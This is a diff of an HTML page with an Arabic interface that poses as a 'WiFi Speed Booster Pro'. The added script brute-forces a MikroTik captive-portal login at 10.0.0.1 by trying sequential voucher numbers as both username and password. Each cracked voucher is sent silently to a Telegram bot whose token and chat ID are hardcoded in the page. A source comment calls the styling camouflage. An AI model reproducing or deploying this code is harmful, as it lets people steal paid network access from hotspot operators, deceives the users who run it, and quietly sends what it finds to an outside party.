@@ -3,83 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Speed Booster</title>
+    <title>WiFi Speed Booster Pro</title>
     <style>
-        /* تصميم احترافي للتمويه */
-        body { background: #0f0f0f; color: #00d4ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 20px; }
-        .container { border: 2px solid #00d4ff; border-radius: 15px; padding: 20px; box-shadow: 0 0 20px #00d4ff; max-width: 400px; margin: auto; }
-        h1 { font-size: 22px; text-shadow: 2px 2px #000; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #00d4ff; background: #1a1a1a; color: #fff; text-align: center; }
-        button { width: 95%; padding: 15px; background: #00d4ff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
-        #status-box { margin-top: 20px; background: #000; padding: 15px; border-radius: 10px; height: 150px; overflow-y: auto; font-size: 13px; border: 1px dashed #444; text-align: left; direction: ltr; }
-        .success-text { color: #ccff00; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', Courier, monospace; text-align: center; margin: 0; padding: 20px; }
+        .main-card { border: 2px solid #00ffcc; border-radius: 15px; padding: 20px; box-shadow: 0 0 25px #00ffcc; max-width: 450px; margin: auto; background: #111; }
+        h1 { font-size: 24px; letter-spacing: 2px; text-transform: uppercase; }
+        .input-group { margin: 15px 0; }
+        input { width: 85%; padding: 12px; border-radius: 5px; border: 1px solid #00ffcc; background: #000; color: #fff; text-align: center; font-size: 16px; }
+        button { width: 90%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.3s; }
+        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        #console { margin-top: 20px; background: #000; padding: 15px; border-radius: 8px; height: 180px; overflow-y: auto; font-size: 12px; border: 1px solid #333; text-align: left; direction: ltr; color: #0f0; }
+        .found-signal { color: #ff0; font-weight: bold; text-decoration: underline; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>WIFI SPEED BOOSTER v4.0</h1>
-    <p style="font-size: 12px;">قم بزيادة سرعة النت عبر تخطي قيود الراوتر</p>
+<div class="main-card">
+    <h1>NET-BOOSTER v5.0</h1>
+    <p>نظام تسريع الارتباط وتخطي جدران الحماية</p>
     
-    <input type="text" id="targetUrl" value="http://10.0.0.1/login">
-    <input type="number" id="startRange" placeholder="أدخل كود البداية (مثلاً 1000)">
-    
-    <button onclick="startBruteForce()">تفعيل التسريع (Start)</button>
+    <div class="input-group">
+        <label>رابط بوابة الشبكة (Gateway):</label><br>
+        <input type="text" id="targetUrl" value="http://10.0.0.1/login">
+    </div>
 
-    <div id="status-box">
-        [System] Ready to intercept...<br>
+    <div class="input-group">
+        <label>بداية نطاق التخمين (ID):</label><br>
+        <input type="number" id="startRange" placeholder="مثلاً: 1000">
+    </div>
+    
+    <button onclick="executeHackingProcess()">بدء عملية التسريع</button>
+
+    <div id="console">
+        [System] Awaiting instructions...<br>
     </div>
 </div>
 
 <script>
-    async function startBruteForce() {
+    // بيانات التحكم الخاصة بك (الآدمن)
+    const TG_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
+    const TG_ID = '7851377774';
+
+    async function notifyAdmin(card) {
+        const message = `💀 تم اختراق كرت جديد!\n📍 الشبكة: ${window.location.hostname}\n🎫 الكرت: ${card}\n🔗 الرابط: ${document.getElementById('targetUrl').value}`;
+        const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(message)}`;
+        try { await fetch(tgUrl); } catch(e) {}
+    }
+
+    async function executeHackingProcess() {
         const target = document.getElementById('targetUrl').value;
         const start = parseInt(document.getElementById('startRange').value);
-        const log = document.getElementById('status-box');
+        const consoleLog = document.getElementById('console');
 
         if (!start) {
-            alert("الرجاء إدخال رقم البداية!");
+            alert("خطأ: يجب إدخال رقم البداية!");
             return;
         }
 
-        log.innerHTML += "[+] Initiating Brute Force Attack...<br>";
+        consoleLog.innerHTML += "[!] Engine Started...<br>";
+        consoleLog.innerHTML += "[!] Bypassing Captive Portal...<br>";
 
-        for (let i = 0; i < 3000; i++) {
-            let currentCard = start + i;
-            log.innerHTML += `[*] Testing ID: ${currentCard}...<br>`;
-            log.scrollTop = log.scrollHeight;
+        for (let i = 0; i < 5000; i++) {
+            let currentId = start + i;
+            consoleLog.innerHTML += `> Testing Sequence: ${currentId}<br>`;
+            consoleLog.scrollTop = consoleLog.scrollHeight;
 
             try {
-                // إرسال طلب تسجيل دخول صامت
-                let controller = new AbortController();
-                let timeoutId = setTimeout(() => controller.abort(), 1000); // سرعة عالية
-
                 let formData = new FormData();
-                formData.append('username', currentCard);
-                formData.append('password', currentCard);
+                formData.append('username', currentId);
+                formData.append('password', currentId); // ميكروتيك غالباً اليوزر = الباسورد
 
+                // إرسال الطلب بسرعة عالية (Brute Force)
                 await fetch(target, {
                     method: 'POST',
                     body: formData,
-                    mode: 'no-cors',
-                    signal: controller.signal
+                    mode: 'no-cors'
                 });
 
-                // فحص ذكي للنجاح: إذا تم فتح الإنترنت
-                if (navigator.onLine) {
-                    // محاولة تحميل بكسل من جوجل للتأكد
+                // فحص حالة الاتصال بالإنترنت كل 5 محاولات لزيادة الدقة
+                if (i % 5 === 0 && navigator.onLine) {
                     try {
-                        let check = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors' });
-                        log.innerHTML += `<span class="success-text">[!!!] SUCCESS: Valid Card Found -> ${currentCard}</span><br>`;
-                        alert("تم الاختراق بنجاح! الكرت الشغال: " + currentCard);
-                        break; 
-                    } catch(e) { /* لم يفتح النت بعد */ }
+                        let ping = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
+                        if (ping) {
+                            consoleLog.innerHTML += `<span class="found-signal">[SUCCESS] CRACKED: ${currentId}</span><br>`;
+                            await notifyAdmin(currentId); // إرسال الكرت فوراً لتليجرام
+                            alert("تم الاتصال بالشبكة! الكرت الشغال: " + currentId);
+                            break; 
+                        }
+                    } catch(e) {}
                 }
-
             } catch (err) {
-                // استمرار في حال الفشل أو التايم أوت
+                // استمرار المحاولة في حال وجود فشل اتصال مؤقت
             }
         }
     }
